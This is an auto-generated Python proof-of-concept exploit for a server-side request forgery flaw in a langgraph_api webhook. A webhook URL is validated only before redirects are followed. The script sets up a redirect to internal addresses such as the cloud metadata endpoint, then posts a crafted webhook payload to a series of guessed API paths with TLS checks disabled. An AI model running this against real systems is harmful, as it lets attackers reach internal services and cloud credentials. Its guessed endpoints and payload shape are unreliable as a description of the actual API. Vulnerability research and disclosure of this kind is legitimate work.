#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-024
# Sink: ssrf_safe_async_client
# Auto-generated — run with: python3 ssrf_url_controlled_stored_result_ssrf_safe_async_client_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Redirect Bypass in langgraph_api webhook

Vulnerability: The webhook URL is validated only on the initial request, but
the HTTP client follows redirects (follow_redirects=True) without re-validation.
An attacker can host a redirect from a public URL to an internal IP (e.g.,
cloud metadata endpoint, internal service) to bypass SSRF protections.

Usage:
    python3 poc_ssrf_redirect.py <attacker_redirect_url>

    Where <attacker_redirect_url> is a URL you control that redirects to an
    internal target (e.g., http://169.254.169.254/latest/meta-data/).

    For testing safely, use a redirect to localhost (e.g., http://127.0.0.1:8080)
    or a benign internal endpoint.

Example:
    # Start a simple redirect server (in another terminal):
    python3 -c "
    from http.server import HTTPServer, BaseHTTPRequestHandler
    class R(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header('Location', 'http://127.0.0.1:8080/admin')
            self.end_headers()
    HTTPServer(('0.0.0.0', 9999), R).serve_forever()
    "
    # Then run:
    python3 poc_ssrf_redirect.py http://your-server:9999/redirect
"""

import argparse
import json
import sys
import urllib.request
import urllib.error
import socket
import ssl
from urllib.parse import urlparse

# Default target - the langgraph API endpoint that accepts webhook URLs
# This should be adjusted based on the actual deployment
DEFAULT_TARGET = "http://localhost:8000"  # Common langgraph API port

def send_webhook_request(target_url, webhook_url):
    """
    Send a request to the langgraph API to trigger a webhook call.
    
    The exact API endpoint depends on the langgraph version. This PoC
    targets the typical webhook submission endpoint.
    """
    # Construct the payload that would trigger a webhook call
    # This mimics what the background worker would process
    payload = {
        "run": {
            "run_id": "poc-test-ssrf-redirect",
            "run_type": "poc",
            "inputs": {},
            "outputs": {},
        },
        "status": "completed",
        "run_started_at": "2024-01-01T00:00:00",
        "run_ended_at": "2024-01-01T00:00:01",
        "checkpoint": {"values": {"test": "poc"}},
        "webhook": webhook_url,
        "exception": None,
    }
    
    # Try different possible endpoints
    endpoints = [
        f"{target_url}/webhook",
        f"{target_url}/api/webhook",
        f"{target_url}/runs/webhook",
        f"{target_url}/background/webhook",
    ]
    
    for endpoint in endpoints:
        try:
            req = urllib.request.Request(
                endpoint,
                data=json.dumps(payload).encode(),
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
                method="POST",
            )
            
            # Disable SSL verification for testing (if using HTTPS)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
                print(f"[+] Sent webhook trigger to {endpoint}")
                print(f"[+] Response status: {response.status}")
                print(f"[+] Response body: {response.read().decode()[:500]}")
                return True
                
        except urllib.error.HTTPError as e:
            if e.code == 404:
                continue  # Try next endpoint
            print(f"[!] HTTP error {e.code} on {endpoint}: {e.read().decode()[:200]}")
        except urllib.error.URLError as e:
            print(f"[!] URL error on {endpoint}: {e.reason}")
        except Exception as e:
            print(f"[!] Error on {endpoint}: {e}")
    
    print("[-] Could not find working endpoint")
    return False

def test_redirect_chain(redirect_url):
    """
    Test if the redirect URL works and where it leads.
    This simulates what the vulnerable client would do.
    """
    print(f"\n[*] Testing redirect chain for: {redirect_url}")
    
    try:
        # Create a context that follows redirects (like the vulnerable client)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        # First request without following redirects to see the initial response
        req = urllib.request.Request(redirect_url, method="GET")
        
        # Use a custom opener that doesn't follow redirects initially
        class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, headers, newurl):
                print(f"[*] Would redirect to: {newurl}")
                # Check if redirect target is internal
                parsed = urlparse(newurl)
                host = parsed.hostname
                try:
                    ip = socket.gethostbyname(host)
                    print(f"[*] Redirect target IP: {ip}")
                    if _is_private_ip(ip):
                        print("[!] VULNERABLE: Redirect leads to private IP!")
                        print(f"[!] This would bypass SSRF protection")
                        return None  # Don't follow for safety
                except socket.gaierror:
                    print(f"[!] Could not resolve {host}")
                return None  # Don't follow for safety
        
        opener = urllib.request.build_opener(NoRedirectHandler)
        with opener.open(req, timeout=10) as response:
            print(f"[*] Initial response status: {response.status}")
            print(f"[*] Initial response headers: {dict(response.headers)}")
            
    except Exception as e:
        print(f"[!] Error testing redirect: {e}")

def _is_private_ip(ip):
    """Check if an IP address is in private/reserved ranges."""
    try:
        parts = [int(x) for x in ip.split('.')]
        if len(parts) != 4:
            return False
        
        # RFC 1918 private ranges
        if parts[0] == 10:
            return True
        if parts[0] == 172 and 16 <= parts[1] <= 31:
            return True
        if parts[0] == 192 and parts[1] == 168:
            return True
        
        # Link-local (169.254.x.x) - includes cloud metadata
        if parts[0] == 169 and parts[1] == 254:
            return True
        
        # Loopback
        if parts[0] == 127:
            return True
        
        return False
    except:
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC: SSRF via Redirect Bypass in langgraph_api webhook"
    )
    parser.add_argument(
        "redirect_url",
        help="URL that redirects to an internal target (e.g., http://your-server/redirect)"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target langgraph API URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Only test the redirect chain, don't send exploit"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("SSRF via Redirect Bypass - Proof of Concept")
    print("=" * 60)
    print(f"\n[*] Attacker redirect URL: {args.redirect_url}")
    print(f"[*] Target API: {args.target}")
    
    # Validate the redirect URL
    parsed = urlparse(args.redirect_url)
    if not parsed.scheme or not parsed.netloc:
        print("[-] Invalid redirect URL. Must include scheme and host.")
        sys.exit(1)
    
    # Test the redirect chain first
    test_redirect_chain(args.redirect_url)
    
    if args.dry_run:
        print("\n[*] Dry run complete. No exploit sent.")
        return
    
    print("\n[*] Attempting to trigger webhook with redirect URL...")
    print("[*] This will send a request to the langgraph API with our malicious webhook URL")
    print("[*] If vulnerable, the server will follow the redirect to an internal IP\n")
    
    # Send the exploit
    success = send_webhook_request(args.target, args.redirect_url)
    
    if success:
        print("\n[+] Exploit attempt completed. Check the target server logs")
        print("[+] If the server followed the redirect, you have confirmed SSRF")
    else:
        print("\n[-] Could not trigger webhook. The API endpoint may differ.")
        print("[*] Try adjusting the --target parameter or check the API documentation")
    
    print("\n[*] Note: This PoC tests the vulnerability by sending a webhook URL")
    print("[*] that redirects to an internal IP. The actual impact depends on")
    print("[*] what internal services are accessible.")

if __name__ == "__main__":
    main()
